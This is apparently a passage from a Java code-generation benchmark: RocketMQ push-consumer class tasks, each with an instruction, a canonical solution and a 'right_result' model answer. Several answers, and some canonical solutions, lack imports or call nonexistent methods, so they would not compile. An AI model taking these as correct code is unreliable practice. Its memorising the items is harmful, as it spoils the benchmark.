    "Instruction": "Task Description: Create a Java class that implements a RocketMQ message consumer using the push model. The class should handle message consumption from a specified topic, with configurable NameServer address and consumer group settings.\n\nClass Description: The Consumer class is a RocketMQ message consumer implementation that subscribes to a topic and processes incoming messages asynchronously. It uses DefaultMQPushConsumer for push-based consumption and provides methods to start, shutdown, and configure the consumer.\n\nAttributes:\n- CONSUMER_GROUP: [String] - The consumer group name for this consumer instance\n- DEFAULT_NAMESRVADDR: [String] - Default NameServer address if none is provided\n- TOPIC: [String] - The topic to subscribe to for messages\n- consumer: [DefaultMQPushConsumer] - The RocketMQ push consumer instance\n\nMethods:\n- Consumer() - [Constructor] -> [void] - Initializes the consumer with default settings, subscribes to the topic, and registers a message listener\n- start() -> [void] - Starts the consumer to begin receiving messages\n- shutdown() -> [void] - Shuts down the consumer gracefully\n- setNamesrvAddr(String namesrvAddr) -> [void] - Sets the NameServer address for the consumer",
    "Canonical_solution": "import org.apache.rocketmq.client.consumer.DefaultMQPushConsumer;\nimport org.apache.rocketmq.client.consumer.listener.ConsumeConcurrentlyStatus;\nimport org.apache.rocketmq.client.consumer.listener.MessageListenerConcurrently;\nimport org.apache.rocketmq.client.exception.MQClientException;\nimport org.apache.rocketmq.common.consumer.ConsumeFromWhere;\n\npublic class Consumer {\n\n    public static final String CONSUMER_GROUP = \"please_rename_unique_group_name_4\";\n    public static final String DEFAULT_NAMESRVADDR = \"127.0.0.1:9876\";\n    public static final String TOPIC = \"TopicTest\";\n\n    private DefaultMQPushConsumer consumer;\n\n    public Consumer() throws MQClientException {\n        consumer = new DefaultMQPushConsumer(CONSUMER_GROUP);\n        consumer.setConsumeFromWhere(ConsumeFromWhere.CONSUME_FROM_FIRST_OFFSET);\n        consumer.subscribe(TOPIC, \"*\");\n        consumer.registerMessageListener((MessageListenerConcurrently) (msg, context) -> {\n            System.out.printf(\"%s Receive New Messages: %s %n\", Thread.currentThread().getName(), msg);\n            return ConsumeConcurrentlyStatus.CONSUME_SUCCESS;\n        });\n    }\n\n    public void start() throws MQClientException {\n        consumer.start();\n        System.out.printf(\"Consumer Started.%n\");\n    }\n\n    public void shutdown() {\n        consumer.shutdown();\n    }\n\n    public void setNamesrvAddr(String namesrvAddr) {\n        consumer.setNamesrvAddr(namesrvAddr);\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 43,
    "right_result": "```java\nimport org.apache.rocketmq.client.consumer.DefaultMQPushConsumer;\nimport org.apache.rocketmq.client.consumer.listener.ConsumeConcurrentlyContext;\nimport org.apache.rocketmq.client.consumer.listener.ConsumeConcurrentlyStatus;\nimport org.apache.rocketmq.client.consumer.listener.MessageListenerConcurrently;\nimport org.apache.rocketmq.common.message.MessageExt;\n\nimport java.util.List;\n\npublic class Consumer {\n    public static final String CONSUMER_GROUP = \"default_consumer_group\";\n    public static final String DEFAULT_NAMESRVADDR = \"localhost:9876\";\n    public static final String TOPIC = \"test_topic\";\n\n    private DefaultMQPushConsumer consumer;\n\n    public Consumer() {\n        try {\n            consumer = new DefaultMQPushConsumer(CONSUMER_GROUP);\n            consumer.setNamesrvAddr(DEFAULT_NAMESRVADDR);\n            consumer.subscribe(TOPIC, \"*\");\n            consumer.registerMessageListener(new MessageListenerConcurrently() {\n                @Override\n                public ConsumeConcurrentlyStatus consumeMessage(List<MessageExt> msgs, ConsumeConcurrentlyContext context) {\n                    for (MessageExt msg : msgs) {\n                        System.out.printf(\"%s Receive New Messages: %s %n\", Thread.currentThread().getName(), new String(msg.getBody()));\n                    }\n                    return ConsumeConcurrentlyStatus.CONSUME_SUCCESS;\n                }\n            });\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n\n    public void start() {\n        consumer.start();\n    }\n\n    public void shutdown() {\n        consumer.shutdown();\n    }\n\n    public void setNamesrvAddr(String namesrvAddr) {\n        consumer.setNamesrvAddr(namesrvAddr);\n    }\n}\n```"
  },
  {
    "Task_id": 361,
    "Instruction": "Task Description: Implement a RocketMQ push consumer in Java that subscribes to a specific topic, processes incoming messages asynchronously, and manages consumer lifecycle operations.\n\nClass Description: LMQPushConsumer is a Java class that encapsulates the functionality of a RocketMQ push consumer. It handles the initialization, startup, and shutdown of the consumer, as well as message consumption from a specified topic using a concurrent message listener.\n\nAttributes:\n- CLUSTER_NAME: [String] - The name of the RocketMQ cluster\n- BROKER_NAME: [String] - The name of the broker\n- TOPIC: [String] - The parent topic name\n- LMQ_TOPIC: [String] - The specific LMQ topic to subscribe to\n- CONSUMER_GROUP: [String] - The consumer group identifier\n- NAMESRV_ADDR: [String] - The NameServer address\n- BROKER_ADDR_MAP: [HashMap<Long, String>] - Mapping of broker IDs to their addresses\n- consumer: [DefaultMQPushConsumer] - The RocketMQ push consumer instance\n\nMethods:\n- initialize(): [void] - Initializes the consumer with configuration settings, subscription, and message listener\n  - Input: None\n  - Output: None\n  - Throws: MQClientException if initialization fails\n- start(): [void] - Starts the consumer and updates topic route information\n  - Input: None\n  - Output: None\n  - Throws: MQClientException if startup fails\n- shutdown(): [void] - Shuts down the consumer gracefully\n  - Input: None\n  - Output: None",
    "Canonical_solution": "import com.google.common.collect.Lists;\nimport java.util.Arrays;\nimport java.util.HashMap;\nimport java.util.HashSet;\nimport java.util.List;\nimport org.apache.rocketmq.client.consumer.DefaultMQPushConsumer;\nimport org.apache.rocketmq.client.consumer.listener.ConsumeConcurrentlyContext;\nimport org.apache.rocketmq.client.consumer.listener.ConsumeConcurrentlyStatus;\nimport org.apache.rocketmq.client.consumer.listener.MessageListenerConcurrently;\nimport org.apache.rocketmq.client.exception.MQClientException;\nimport org.apache.rocketmq.common.MixAll;\nimport org.apache.rocketmq.common.consumer.ConsumeFromWhere;\nimport org.apache.rocketmq.common.message.MessageExt;\nimport org.apache.rocketmq.common.message.MessageQueue;\nimport org.apache.rocketmq.remoting.protocol.route.BrokerData;\nimport org.apache.rocketmq.remoting.protocol.route.TopicRouteData;\n\npublic class LMQPushConsumer {\n    public static final String CLUSTER_NAME = \"DefaultCluster\";\n    public static final String BROKER_NAME = \"broker-a\";\n    public static final String TOPIC = \"TopicLMQParent\";\n    public static final String LMQ_TOPIC = MixAll.LMQ_PREFIX + \"123\";\n    public static final String CONSUMER_GROUP = \"CID_LMQ_1\";\n    public static final String NAMESRV_ADDR = \"127.0.0.1:9876\";\n    public static final HashMap<Long, String> BROKER_ADDR_MAP = new HashMap<Long, String>() {\n        {\n            put(MixAll.MASTER_ID, \"127.0.0.1:10911\");\n        }\n    };\n\n    private DefaultMQPushConsumer consumer;\n\n    public void initialize() throws MQClientException {\n        consumer = new DefaultMQPushConsumer(CONSUMER_GROUP);\n        consumer.setNamesrvAddr(NAMESRV_ADDR);\n        consumer.subscribe(LMQ_TOPIC, \"*\");\n        consumer.setConsumeFromWhere(ConsumeFromWhere.CONSUME_FROM_FIRST_OFFSET);\n        consumer.registerMessageListener(new MessageListenerConcurrently() {\n            @Override\n            public ConsumeConcurrentlyStatus consumeMessage(List<MessageExt> msgs, ConsumeConcurrentlyContext context) {\n                System.out.printf(\"%s Receive New Messages: %s %n\", Thread.currentThread().getName(), msgs);\n                return ConsumeConcurrentlyStatus.CONSUME_SUCCESS;\n            }\n        });\n    }\n\n    public void start() throws MQClientException {\n        consumer.start();\n        consumer.getDefaultMQPushConsumerImpl().getmQClientFactory().updateTopicRouteInfoFromNameServer(TOPIC);\n\n        final TopicRouteData topicRouteData = new TopicRouteData();\n        final BrokerData brokerData = new BrokerData();\n        brokerData.setCluster(CLUSTER_NAME);\n        brokerData.setBrokerName(BROKER_NAME);\n        brokerData.setBrokerAddrs(BROKER_ADDR_MAP);\n        topicRouteData.setBrokerDatas(Lists.newArrayList(brokerData));\n        consumer.getDefaultMQPushConsumerImpl().getmQClientFactory().getTopicRouteTable().put(LMQ_TOPIC, topicRouteData);\n        consumer.getDefaultMQPushConsumerImpl().updateTopicSubscribeInfo(LMQ_TOPIC,\n            new HashSet<>(Arrays.asList(new MessageQueue(LMQ_TOPIC, BROKER_NAME, (int) MixAll.LMQ_QUEUE_ID))));\n        consumer.getDefaultMQPushConsumerImpl().getmQClientFactory().doRebalance();\n    }\n\n    public void shutdown() {\n        consumer.shutdown();\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 43,
    "right_result": "```java\nimport org.apache.rocketmq.client.consumer.DefaultMQPushConsumer;\nimport org.apache.rocketmq.client.consumer.listener.ConsumeConcurrentlyContext;\nimport org.apache.rocketmq.client.consumer.listener.ConsumeConcurrentlyStatus;\nimport org.apache.rocketmq.client.consumer.listener.MessageListenerConcurrently;\nimport org.apache.rocketmq.common.message.MessageExt;\nimport java.util.HashMap;\nimport java.util.List;\n\npublic class LMQPushConsumer {\n    private String CLUSTER_NAME;\n    private String BROKER_NAME;\n    private String TOPIC;\n    private String LMQ_TOPIC;\n    private String CONSUMER_GROUP;\n    private String NAMESRV_ADDR;\n    private HashMap<Long, String> BROKER_ADDR_MAP = new HashMap<>();\n    private DefaultMQPushConsumer consumer;\n\n    public void initialize() throws Exception {\n        consumer = new DefaultMQPushConsumer(CONSUMER_GROUP);\n        consumer.setNamesrvAddr(NAMESRV_ADDR);\n        consumer.subscribe(LMQ_TOPIC, \"*\");\n        consumer.registerMessageListener(new MessageListenerConcurrently() {\n            @Override\n            public ConsumeConcurrentlyStatus consumeMessage(List<MessageExt> msgs, ConsumeConcurrentlyContext context) {\n                // Process messages asynchronously here\n                return ConsumeConcurrentlyStatus.CONSUME_SUCCESS;\n            }\n        });\n    }\n\n    public void start() throws Exception {\n        consumer.start();\n        consumer.updateTopicRouteInfoFromNameServer();\n    }\n\n    public void shutdown() {\n        consumer.shutdown();\n    }\n}\n```"
  },
  {
    "Task_id": 362,
    "Instruction": "Task Description: Create a Java class that implements a RocketMQ push consumer for processing order-related messages. The consumer should be initialized with Spring and configured to consume messages from a specified topic.\n\nClass Description: The OrderPushConsumer class is a Spring component that initializes and manages a RocketMQ push consumer. It subscribes to a specified topic, configures consumption settings, and processes incoming messages asynchronously.\n\nAttributes:\n- consumer: DefaultMQPushConsumer - The RocketMQ push consumer instance\n- topicName: String - The name of the topic to subscribe to (injected from properties)\n- namesrvAddr: String - The address of the NameServer (injected from properties)\n\nMethods:\n- init(): void - Initializes the consumer with configuration settings and starts it. This method is automatically called after construction due to the @PostConstruct annotation.\n  - Input: None\n  - Output: None\n  - Description: Configures the consumer with NameServer address, subscription details, batch size, and consumption strategy. Registers a message listener and starts the consumer.\n\n- (implicit) MessageListenerConcurrently.consumeMessage(List<MessageExt>, ConsumeConcurrentlyContext) -> ConsumeConcurrentlyStatus - Handles incoming messages\n  - Input: \n    - msgs: List<MessageExt> - List of received messages\n    - context: ConsumeConcurrentlyContext - Context for concurrent consumption\n  - Output: ConsumeConcurrentlyStatus - Status indicating whether message processing was successful\n  - Description: The anonymous implementation of MessageListenerConcurrently that processes batches of messages. Currently returns CONSUME_SUCCESS for all messages.",
    "Canonical_solution": "import org.apache.rocketmq.client.consumer.DefaultMQPushConsumer;\nimport org.apache.rocketmq.client.consumer.listener.ConsumeConcurrentlyContext;\nimport org.apache.rocketmq.client.consumer.listener.ConsumeConcurrentlyStatus;\nimport org.apache.rocketmq.client.consumer.listener.MessageListenerConcurrently;\nimport org.apache.rocketmq.common.consumer.ConsumeFromWhere;\nimport org.apache.rocketmq.common.message.MessageExt;\nimport org.springframework.beans.factory.annotation.Value;\nimport org.springframework.stereotype.Component;\n\nimport javax.annotation.PostConstruct;\nimport java.util.List;\n\n@Component\npublic class OrderPushConsumer {\n\n    private DefaultMQPushConsumer consumer;\n\n    @Value(\"${rocketmq.topic.name}\")\n    private String topicName;\n\n    @Value(\"${rocketmq.nameserver.addr}\")\n    private String namesrvAddr;\n\n    @PostConstruct\n    public void init() throws Exception {\n        consumer = new DefaultMQPushConsumer(\"create_order_consumer_group2\");\n        consumer.setNamesrvAddr(namesrvAddr);\n        consumer.subscribe(topicName,\"*\");\n        consumer.setConsumeMessageBatchMaxSize(100);\n        consumer.setConsumeFromWhere(ConsumeFromWhere.CONSUME_FROM_FIRST_OFFSET);\n\n        consumer.registerMessageListener(new MessageListenerConcurrently() {\n            @Override\n            public ConsumeConcurrentlyStatus consumeMessage(List<MessageExt> msgs, ConsumeConcurrentlyContext context) {\n                return ConsumeConcurrentlyStatus.CONSUME_SUCCESS;\n            }\n        });\n        consumer.start();\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 43,
    "right_result": "```java\nimport org.apache.rocketmq.client.consumer.DefaultMQPushConsumer;\nimport org.apache.rocketmq.client.consumer.listener.ConsumeConcurrentlyContext;\nimport org.apache.rocketmq.client.consumer.listener.ConsumeConcurrentlyStatus;\nimport org.apache.rocketmq.client.consumer.listener.MessageListenerConcurrently;\nimport org.apache.rocketmq.common.message.MessageExt;\nimport org.springframework.beans.factory.annotation.Value;\nimport org.springframework.stereotype.Component;\n\nimport javax.annotation.PostConstruct;\nimport java.util.List;\n\n@Component\npublic class OrderPushConsumer {\n\n    private DefaultMQPushConsumer consumer;\n    @Value(\"${rocketmq.order.topic}\")\n    private String topicName;\n    @Value(\"${rocketmq.namesrv.addr}\")\n    private String namesrvAddr;\n\n    @PostConstruct\n    public void init() {\n        consumer = new DefaultMQPushConsumer(\"order-consumer-group\");\n        consumer.setNamesrvAddr(namesrvAddr);\n        consumer.subscribe(topicName, \"*\");\n        consumer.registerMessageListener((List<MessageExt> msgs, ConsumeConcurrentlyContext context) -> {\n            // Process messages here\n            return ConsumeConcurrentlyStatus.CONSUME_SUCCESS;\n        });\n        try {\n            consumer.start();\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n\n    // Implicit MessageListenerConcurrently implementation\n}\n```"
  },
  {
    "Task_id": 365,
    "Instruction": "Task Description: Create a Java class that implements a RocketMQ push consumer to asynchronously receive and process messages from a specified topic.\n\nClass Description: The PushConsumer class provides a wrapper around RocketMQ's DefaultMQPushConsumer to simplify message consumption. It handles consumer initialization, topic subscription, message listening, and lifecycle management.\n\nAttributes:\n- consumer: DefaultMQPushConsumer - The underlying RocketMQ push consumer instance\n\nMethods:\n- PushConsumer(String consumerGroup, String namesrvAddr) -> void - Constructor that initializes the consumer with a consumer group and NameServer address\n- subscribe(String topic, String subExpression) -> void - Subscribes to a specific topic with optional tag filtering\n- setConsumeFromWhere(ConsumeFromWhere consumeFromWhere) -> void - Sets the consumption starting point (e.g., from last offset or earliest)\n- setConsumeTimestamp(String consumeTimestamp) -> void - Sets the timestamp for consumption starting point\n- registerMessageListener(MessageListenerConcurrently listener) -> void - Registers a callback for processing received messages\n- start() -> void - Starts the consumer to begin message consumption\n- shutdown() -> void - Shuts down the consumer gracefully\n\nNested Class:\n- SimpleMessageListener: MessageListenerConcurrently - A basic message listener implementation that prints received messages and returns success status",
    "Canonical_solution": "import org.apache.rocketmq.client.consumer.DefaultMQPushConsumer;\nimport org.apache.rocketmq.client.consumer.listener.ConsumeConcurrentlyContext;\nimport org.apache.rocketmq.client.consumer.listener.ConsumeConcurrentlyStatus;\nimport org.apache.rocketmq.client.consumer.listener.MessageListenerConcurrently;\nimport org.apache.rocketmq.client.exception.MQClientException;\nimport org.apache.rocketmq.common.consumer.ConsumeFromWhere;\nimport org.apache.rocketmq.common.message.MessageExt;\n\nimport java.util.List;\n\npublic class PushConsumer {\n\n    private DefaultMQPushConsumer consumer;\n\n    public PushConsumer(String consumerGroup, String namesrvAddr) throws MQClientException {\n        consumer = new DefaultMQPushConsumer(consumerGroup);\n        consumer.setNamesrvAddr(namesrvAddr);\n    }\n\n    public void subscribe(String topic, String subExpression) throws MQClientException {\n        consumer.subscribe(topic, subExpression);\n    }\n\n    public void setConsumeFromWhere(ConsumeFromWhere consumeFromWhere) {\n        consumer.setConsumeFromWhere(consumeFromWhere);\n    }\n\n    public void setConsumeTimestamp(String consumeTimestamp) {\n        consumer.setConsumeTimestamp(consumeTimestamp);\n    }\n\n    public void registerMessageListener(MessageListenerConcurrently listener) {\n        consumer.registerMessageListener(listener);\n    }\n\n    public void start() throws MQClientException {\n        consumer.start();\n    }\n\n    public void shutdown() {\n        consumer.shutdown();\n    }\n\n    public static class SimpleMessageListener implements MessageListenerConcurrently {\n        @Override\n        public ConsumeConcurrentlyStatus consumeMessage(List<MessageExt> msgs, ConsumeConcurrentlyContext context) {\n            System.out.printf(Thread.currentThread().getName() + \" Receive New Messages: \" + msgs + \"%n\");\n            return ConsumeConcurrentlyStatus.CONSUME_SUCCESS;\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 43,
    "right_result": "```java\nimport org.apache.rocketmq.client.consumer.DefaultMQPushConsumer;\nimport org.apache.rocketmq.client.consumer.listener.ConsumeConcurrentlyContext;\nimport org.apache.rocketmq.client.consumer.listener.ConsumeConcurrentlyStatus;\nimport org.apache.rocketmq.client.consumer.listener.MessageListenerConcurrently;\nimport org.apache.rocketmq.common.message.MessageExt;\n\nimport java.util.List;\n\npublic class PushConsumer {\n    private DefaultMQPushConsumer consumer;\n\n    public PushConsumer(String consumerGroup, String namesrvAddr) throws Exception {\n        this.consumer = new DefaultMQPushConsumer(consumerGroup);\n        this.consumer.setNamesrvAddr(namesrvAddr);\n    }\n\n    public void subscribe(String topic, String subExpression) {\n        this.consumer.subscribe(topic, subExpression);\n    }\n\n    public void setConsumeFromWhere(ConsumeFromWhere consumeFromWhere) {\n        this.consumer.setConsumeFromWhere(consumeFromWhere);\n    }\n\n    public void setConsumeTimestamp(String consumeTimestamp) {\n        this.consumer.setConsumeTimestamp(consumeTimestamp);\n    }\n\n    public void registerMessageListener(MessageListenerConcurrently listener) {\n        this.consumer.registerMessageListener(listener);\n    }\n\n    public void start() throws Exception {\n        this.consumer.start();\n    }\n\n    public void shutdown() {\n        this.consumer.shutdown();\n    }\n\n    public static class SimpleMessageListener implements MessageListenerConcurrently {\n        @Override\n        public ConsumeConcurrentlyStatus consumeMessage(List<MessageExt> msgs, ConsumeConcurrentlyContext context) {\n            for (MessageExt msg : msgs) {\n                System.out.printf(\"%s Receive New Messages: %s %n\", Thread.currentThread().getName(), new String(msg.getBody()));\n            }\n            return ConsumeConcurrentlyStatus.CONSUME_SUCCESS;\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 367,
    "Instruction": "Task Description: Create a Java class that configures and initializes a RocketMQ push consumer with specific settings for message consumption, including topic subscription and message listener registration.\n\nClass Description: The `AliyunMqConfiguration` class is a Spring configuration class responsible for setting up a RocketMQ push consumer. It configures the consumer with NameServer address, consumption strategy, topic subscriptions, and message listeners. The consumer is started asynchronously after a short delay to ensure proper initialization.\n\nAttributes:\n- `uacPushMessageListener`: [UacPushMessageListener] - The message listener implementation that handles incoming messages\n- `paascloudProperties`: [PaascloudProperties] - Configuration properties containing RocketMQ settings\n- `taskExecutor`: [TaskExecutor] - Executor service for asynchronous consumer startup\n\nMethods:\n- `defaultMQPushConsumer()`: [None] -> [DefaultMQPushConsumer] - Configures and initializes the RocketMQ push consumer with the following steps:\n  1. Creates a new DefaultMQPushConsumer instance with the consumer group from properties\n  2. Sets the NameServer address from properties\n  3. Configures consumption to start from the last offset\n  4. Parses and subscribes to topics and tags from constants\n  5. Registers the message listener\n  6. Sets thread pool size for message consumption\n  7. Starts the consumer asynchronously after a 5-second delay\n  8. Returns the configured consumer instance",
    "Canonical_solution": "import com.paascloud.PublicUtil;\nimport com.paascloud.base.constant.AliyunMqTopicConstants;\nimport com.paascloud.base.constant.GlobalConstant;\nimport com.paascloud.config.properties.PaascloudProperties;\nimport com.paascloud.provider.mq.consumer.listener.UacPushMessageListener;\nimport org.apache.rocketmq.client.consumer.DefaultMQPushConsumer;\nimport org.apache.rocketmq.client.exception.MQClientException;\nimport org.apache.rocketmq.common.consumer.ConsumeFromWhere;\nimport org.springframework.core.task.TaskExecutor;\n\n@Configuration\npublic class AliyunMqConfiguration {\n    @Resource\n    private UacPushMessageListener uacPushMessageListener;\n\n    @Resource\n    private PaascloudProperties paascloudProperties;\n\n    @Resource\n    private TaskExecutor taskExecutor;\n\n    @Bean\n    public DefaultMQPushConsumer defaultMQPushConsumer() throws MQClientException {\n        DefaultMQPushConsumer consumer = new DefaultMQPushConsumer(paascloudProperties.getAliyun().getRocketMq().getConsumerGroup());\n        consumer.setNamesrvAddr(paascloudProperties.getAliyun().getRocketMq().getNamesrvAddr());\n        consumer.setConsumeFromWhere(ConsumeFromWhere.CONSUME_FROM_LAST_OFFSET);\n\n        String[] strArray = AliyunMqTopicConstants.ConsumerTopics.UAC.split(GlobalConstant.Symbol.COMMA);\n        for (String aStrArray : strArray) {\n            String[] topicArray = aStrArray.split(GlobalConstant.Symbol.AT);\n            String topic = topicArray[0];\n            String tags = topicArray[1];\n            if (PublicUtil.isEmpty(tags)) {\n                tags = \"*\";\n            }\n            consumer.subscribe(topic, tags);\n        }\n\n        consumer.registerMessageListener(uacPushMessageListener);\n        consumer.setConsumeThreadMax(2);\n        consumer.setConsumeThreadMin(2);\n\n        taskExecutor.execute(() -> {\n            try {\n                Thread.sleep(5000);\n                consumer.start();\n            } catch (InterruptedException | MQClientException e) {\n                log.error(\"RocketMq OpcPushConsumer, Exception={}\", e.getMessage(), e);\n            }\n        });\n        return consumer;\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 43,
    "right_result": "```java\nimport org.apache.rocketmq.client.consumer.DefaultMQPushConsumer;\nimport org.springframework.beans.factory.annotation.Autowired;\nimport org.springframework.context.annotation.Bean;\nimport org.springframework.context.annotation.Configuration;\n\n@Configuration\npublic class AliyunMqConfiguration {\n\n    @Autowired\n    private UacPushMessageListener uacPushMessageListener;\n\n    @Autowired\n    private PaascloudProperties paascloudProperties;\n\n    @Autowired\n    private TaskExecutor taskExecutor;\n\n    @Bean\n    public DefaultMQPushConsumer defaultMQPushConsumer() {\n        DefaultMQPushConsumer consumer = new DefaultMQPushConsumer(paascloudProperties.getRocketmq().getConsumerGroup());\n        consumer.setNamesrvAddr(paascloudProperties.getRocketmq().getNameServer());\n        consumer.setConsumeFromWhere(ConsumeFromWhere.CONSUME_FROM_LAST_OFFSET);\n        consumer.subscribe(RocketMQConstants.TOPIC, RocketMQConstants.TAG);\n        consumer.registerMessageListener(uacPushMessageListener);\n        consumer.setConsumeThreadMin(20);\n        consumer.setConsumeThreadMax(20);\n\n        taskExecutor.execute(() -> {\n            try {\n                Thread.sleep(5000);\n                consumer.start();\n            } catch (InterruptedException e) {\n                Thread.currentThread().interrupt();\n            }\n        });\n\n        return consumer;\n    }\n}\n```"
  },
  {
    "Task_id": 368,
    "Instruction": "Task Description: Create a Java class that implements a RocketMQ consumer to asynchronously receive and process messages from a specified topic.\n\nClass Description: The RocketMQConsumer class provides functionality to initialize, configure, and manage a RocketMQ push consumer. It allows subscribing to topics, registering message listeners, and controlling the consumer lifecycle.\n\nAttributes:\n- pushConsumer: DefaultMQPushConsumer - The core RocketMQ push consumer instance that handles message consumption\n\nMethods:\n- initializeConsumer(String consumerGroup, String namesrvAddr) -> void - Initializes the consumer with a consumer group and NameServer address. Sets consumption strategy to start from last offset and message model to clustering.\n- subscribeToTopic(String topic, String tagExpression) -> void - Subscribes to a specific topic with optional tag filtering\n- registerMessageListener(MessageListenerConcurrently listener) -> void - Registers a concurrent message listener to handle incoming messages\n- startConsumer() -> void - Starts the consumer to begin receiving messages\n- shutdownConsumer() -> void - Gracefully shuts down the consumer instance",
    "Canonical_solution": "import org.apache.rocketmq.client.consumer.DefaultMQPushConsumer;\nimport org.apache.rocketmq.client.consumer.listener.ConsumeConcurrentlyContext;\nimport org.apache.rocketmq.client.consumer.listener.ConsumeConcurrentlyStatus;\nimport org.apache.rocketmq.client.consumer.listener.MessageListenerConcurrently;\nimport org.apache.rocketmq.client.exception.MQClientException;\nimport org.apache.rocketmq.common.consumer.ConsumeFromWhere;\nimport org.apache.rocketmq.common.protocol.heartbeat.MessageModel;\n\nimport java.util.List;\n\npublic class RocketMQConsumer {\n\n    private DefaultMQPushConsumer pushConsumer;\n\n    public void initializeConsumer(String consumerGroup, String namesrvAddr) throws MQClientException {\n        pushConsumer = new DefaultMQPushConsumer(consumerGroup);\n        pushConsumer.setNamesrvAddr(namesrvAddr);\n        pushConsumer.setConsumeFromWhere(ConsumeFromWhere.CONSUME_FROM_LAST_OFFSET);\n        pushConsumer.setMessageModel(MessageModel.CLUSTERING);\n    }\n\n    public void subscribeToTopic(String topic, String tagExpression) throws MQClientException {\n        pushConsumer.subscribe(topic, tagExpression);\n    }\n\n    public void registerMessageListener(MessageListenerConcurrently listener) {\n        pushConsumer.registerMessageListener(new MessageListenerConcurrently() {\n            @Override\n            public ConsumeConcurrentlyStatus consumeMessage(List<MessageExt> msgs,\n                ConsumeConcurrentlyContext context) {\n                return listener.consumeMessage(msgs, context);\n            }\n        });\n    }\n\n    public void startConsumer() throws MQClientException {\n        pushConsumer.start();\n    }\n\n    public void shutdownConsumer() {\n        pushConsumer.shutdown();\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 43,
    "right_result": "```java\nimport org.apache.rocketmq.client.consumer.DefaultMQPushConsumer;\nimport org.apache.rocketmq.client.consumer.listener.ConsumeConcurrentlyContext;\nimport org.apache.rocketmq.client.consumer.listener.ConsumeConcurrentlyStatus;\nimport org.apache.rocketmq.client.consumer.listener.MessageListenerConcurrently;\nimport org.apache.rocketmq.common.message.MessageExt;\n\nimport java.util.List;\n\npublic class RocketMQConsumer {\n    private DefaultMQPushConsumer pushConsumer;\n\n    public void initializeConsumer(String consumerGroup, String namesrvAddr) {\n        pushConsumer = new DefaultMQPushConsumer(consumerGroup);\n        pushConsumer.setNamesrvAddr(namesrvAddr);\n        pushConsumer.setConsumeFromWhere(ConsumeFromWhere.CONSUME_FROM_LAST_OFFSET);\n        pushConsumer.setMessageModel(MessageModel.CLUSTERING);\n    }\n\n    public void subscribeToTopic(String topic, String tagExpression) {\n        pushConsumer.subscribe(topic, tagExpression);\n    }\n\n    public void registerMessageListener(MessageListenerConcurrently listener) {\n        pushConsumer.registerMessageListener(listener);\n    }\n\n    public void startConsumer() throws Exception {\n        pushConsumer.start();\n    }\n\n    public void shutdownConsumer() {\n        pushConsumer.shutdown();\n    }\n}\n```"
  },
  {
    "Task_id": 369,
    "Instruction": "Task Description: Create a Java class that implements a RocketMQ push consumer to subscribe to messages from a specified topic and process them asynchronously.\n\nClass Description: The PushConsumer class is a RocketMQ message consumer that uses push mode to receive messages from a message queue. It handles message subscription, listener registration, and consumer lifecycle management.\n\nAttributes:\n- consumer: DefaultMQPushConsumer - The core RocketMQ push consumer instance that handles message consumption\n\nMethods:\n- PushConsumer(String consumerGroup, String namesrvAddr) -> void - Constructor that initializes the consumer with a consumer group and NameServer address\n- subscribe(String topic, String subExpression) -> void - Subscribes to a specific topic with optional tag filtering\n- registerMessageListener(MessageListenerConcurrently listener) -> void - Registers a message listener to handle incoming messages\n- start() -> void - Starts the consumer to begin receiving messages\n- shutdown() -> void - Shuts down the consumer gracefully\n\nNested Class:\n- SimpleMessageListener: MessageListenerConcurrently - A basic message listener implementation that prints received messages\n  Methods:\n  - consumeMessage(List<MessageExt> msgs, ConsumeConcurrentlyContext context) -> ConsumeConcurrentlyStatus - Processes received messages and returns consumption status",
    "Canonical_solution": "import org.apache.rocketmq.client.consumer.DefaultMQPushConsumer;\nimport org.apache.rocketmq.client.consumer.listener.ConsumeConcurrentlyContext;\nimport org.apache.rocketmq.client.consumer.listener.ConsumeConcurrentlyStatus;\nimport org.apache.rocketmq.client.consumer.listener.MessageListenerConcurrently;\nimport org.apache.rocketmq.client.exception.MQClientException;\nimport org.apache.rocketmq.common.consumer.ConsumeFromWhere;\nimport org.apache.rocketmq.common.message.MessageExt;\nimport org.apache.rocketmq.common.protocol.heartbeat.MessageModel;\n\nimport java.util.List;\n\npublic class PushConsumer {\n\n    private DefaultMQPushConsumer consumer;\n\n    public PushConsumer(String consumerGroup, String namesrvAddr) throws MQClientException {\n        consumer = new DefaultMQPushConsumer(consumerGroup);\n        consumer.setNamesrvAddr(namesrvAddr);\n        consumer.setConsumeFromWhere(ConsumeFromWhere.CONSUME_FROM_FIRST_OFFSET);\n        consumer.setMessageModel(MessageModel.BROADCASTING);\n    }\n\n    public void subscribe(String topic, String subExpression) throws MQClientException {\n        consumer.subscribe(topic, subExpression);\n    }\n\n    public void registerMessageListener(MessageListenerConcurrently listener) {\n        consumer.registerMessageListener(listener);\n    }\n\n    public void start() throws MQClientException {\n        consumer.start();\n    }\n\n    public void shutdown() {\n        consumer.shutdown();\n    }\n\n    public static class SimpleMessageListener implements MessageListenerConcurrently {\n        @Override\n        public ConsumeConcurrentlyStatus consumeMessage(List<MessageExt> msgs,\n                                                      ConsumeConcurrentlyContext context) {\n            System.out.printf(Thread.currentThread().getName() + \" Receive New Messages: \" + msgs + \"%n\");\n            return ConsumeConcurrentlyStatus.CONSUME_SUCCESS;\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 43,
